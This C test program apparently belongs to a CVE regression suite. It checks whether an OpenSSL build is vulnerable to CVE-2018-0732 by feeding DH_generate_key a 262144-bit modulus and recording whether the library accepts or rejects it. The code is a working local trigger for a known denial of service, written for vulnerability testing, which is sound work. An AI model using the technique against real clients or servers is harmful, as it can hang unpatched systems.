/* SPDX-License-Identifier: Apache-2.0 */
/*
 * CVE-2018-0732 - denial of service in DH key generation with a huge modulus.
 * generate_key() had no size check on dh->p, so a DHE handshake where the
 * peer supplies an enormous prime makes the client spend extreme time in the
 * modular exponentiation. Fix: 3984ef0b72 (crypto/dh/dh_key.c) rejects
 * p > OPENSSL_DH_MAX_MODULUS_BITS (10000). Reachable via DHE when enabled
 * (app opt-in; wpa_supplicant EAP keeps the default list).
 *
 * attack : p = a huge odd modulus (KKTLS_DH_BITS, default 262144 bits), g = 2.
 * control: a normal 512-bit modulus, fast.
 *
 * Verdict (hang class, by work done): DH_generate_key returning 1
 * on the huge modulus means the modexp was done (KKTLS_CVE_RESULT=accepted,
 * vulnerable however fast the host); a fixed lib refuses with
 * DH_R_MODULUS_TOO_LARGE (rejected). Not returning within the expect
 * timeout is the safety bound (vulnerable).
 */
#include <openssl/dh.h>
#include <openssl/err.h>
#include <openssl/bn.h>
#include <stdlib.h>
#include "../cve_common.h"

int main(int argc, char **argv)
{
    int ctl = cve_is_control(argc, argv);
    DH *dh = DH_new();
    int bits, ok;

    dh->p = BN_new();
    dh->g = BN_new();
    BN_set_word(dh->g, 2);

    if (ctl) {
        bits = 512;
    } else {
        const char *env = getenv("KKTLS_DH_BITS");
        bits = env ? atoi(env) : 262144;
    }

    /* p = 2^(bits-1) + ... + 1 (all bits set -> large and odd); not prime,
     * but generate_key does the modexp regardless on the unfixed code. */
    BN_set_bit(dh->p, bits - 1);
    BN_set_bit(dh->p, 1);
    BN_set_bit(dh->p, 0);

    cve_call("DH_generate_key");
    ok = DH_generate_key(dh);
    cve_reached("DH_generate_key");
    if (ok)
        printf("DH_generate_key ok (%d bits)\n", bits);
    else
        printf("DH_generate_key refused (%d bits)\n", bits);
    {
        char det[64];
        snprintf(det, sizeof(det), "bits=%d", bits);
        if (ok)
            cve_result("accepted", det);
        else if (ERR_GET_REASON(ERR_peek_last_error()) == DH_R_MODULUS_TOO_LARGE)
            cve_result("rejected", "DH_R_MODULUS_TOO_LARGE");
        else
            cve_result("unexpected", "other-error");
    }

    DH_free(dh);
    return 0;
}
